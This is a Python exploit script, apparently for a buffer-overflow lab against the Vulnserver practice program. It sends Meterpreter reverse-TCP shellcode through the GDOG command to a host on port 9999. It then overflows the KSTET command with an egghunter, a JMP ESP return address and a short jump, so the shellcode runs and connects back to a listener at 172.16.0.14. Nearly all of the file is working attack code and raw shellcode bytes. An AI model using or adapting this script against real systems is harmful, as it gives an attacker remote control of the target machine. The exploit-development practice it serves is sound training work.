import sys
import socket

#32byte egghunter tag=dude "\x64\x75\x64\x65"
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += b"\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.0.14 LPORT=4444 -b "\x00" -f python -b

buf =  b""
buf += b"\xba\xf2\x4b\x87\x3d\xda\xcd\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x56\x83\xc6\x04\x31\x56\x0f\x03\x56\xfd\xa9"
buf += b"\x72\xc1\xe9\xac\x7d\x3a\xe9\xd0\xf4\xdf\xd8\xd0\x63"
buf += b"\xab\x4a\xe1\xe0\xf9\x66\x8a\xa5\xe9\xfd\xfe\x61\x1d"
buf += b"\xb6\xb5\x57\x10\x47\xe5\xa4\x33\xcb\xf4\xf8\x93\xf2"
buf += b"\x36\x0d\xd5\x33\x2a\xfc\x87\xec\x20\x53\x38\x99\x7d"
buf += b"\x68\xb3\xd1\x90\xe8\x20\xa1\x93\xd9\xf6\xba\xcd\xf9"
buf += b"\xf9\x6f\x66\xb0\xe1\x6c\x43\x0a\x99\x46\x3f\x8d\x4b"
buf += b"\x97\xc0\x22\xb2\x18\x33\x3a\xf2\x9e\xac\x49\x0a\xdd"
buf += b"\x51\x4a\xc9\x9c\x8d\xdf\xca\x06\x45\x47\x37\xb7\x8a"
buf += b"\x1e\xbc\xbb\x67\x54\x9a\xdf\x76\xb9\x90\xdb\xf3\x3c"
buf += b"\x77\x6a\x47\x1b\x53\x37\x13\x02\xc2\x9d\xf2\x3b\x14"
buf += b"\x7e\xaa\x99\x5e\x92\xbf\x93\x3c\xfa\x0c\x9e\xbe\xfa"
buf += b"\x1a\xa9\xcd\xc8\x85\x01\x5a\x60\x4d\x8c\x9d\xf1\x59"
buf += b"\x2f\x71\xb9\x0a\xd1\x72\xb9\x03\x16\x26\xe9\x3b\xbf"
buf += b"\x47\x62\xbc\x40\x92\x1e\xb6\xd6\xb1\xce\xc6\x28\xa2"
buf += b"\xec\xc6\x25\x6e\x79\x20\x15\xde\x29\xfd\xd6\x8e\x89"
buf += b"\xad\xbe\xc4\x06\x91\xdf\xe6\xcd\xba\x4a\x09\xbb\x93"
buf += b"\xe2\xb0\xe6\x68\x92\x3d\x3d\x15\x94\xb6\xb7\xe9\x5b"
buf += b"\x3f\xb2\xf9\x8c\x58\x3c\x02\x4d\xcd\x3c\x68\x49\x47"
buf += b"\x6b\x04\x53\xbe\x5b\x8b\xac\x95\xd8\xcc\x53\x68\xe8"
buf += b"\xa7\x62\xfe\x54\xd0\x8a\xee\x54\x20\xdd\x64\x54\x48"
buf += b"\xb9\xdc\x07\x6d\xc6\xc8\x34\x3e\x53\xf3\x6c\x92\xf4"
buf += b"\x9b\x92\xcd\x33\x04\x6d\x38\x40\x43\x91\xbe\x6f\xec"
buf += b"\xf9\x40\x30\x0c\xf9\x2a\xb0\x5c\x91\xa1\x9f\x53\x51"
buf += b"\x49\x0a\x3c\xf9\xc0\xdb\x8e\x98\xd5\xf1\x4f\x04\xd5"
buf += b"\xf6\x4b\xb7\xac\x77\x6b\x38\x51\x9e\x08\x39\x51\x9e"
buf += b"\x2e\x06\x87\xa7\x44\x49\x1b\x9c\x57\xfc\x3e\xb5\xfd"
buf += b"\xfe\x6d\xc5\xd7"

cmd = "GDOG " + "shellcode" + "KSTET " + "stuff"

shellcode = "dudedude" + buf

#JMP ESP 625011AF configuration.dll
#nasm ESP-70 EB B8
stuff = "\x90"*18 + egghunter + "\x90"*20 + "\xaf\x11\x50\x62" + "\xEB\xB8\x90\x90" + "X"*(1000-len(cmd))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cmd1 = "GDOG " + shellcode
s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(cmd1)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cmd2 = "KSTET " + stuff

s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(cmd2)
s.close()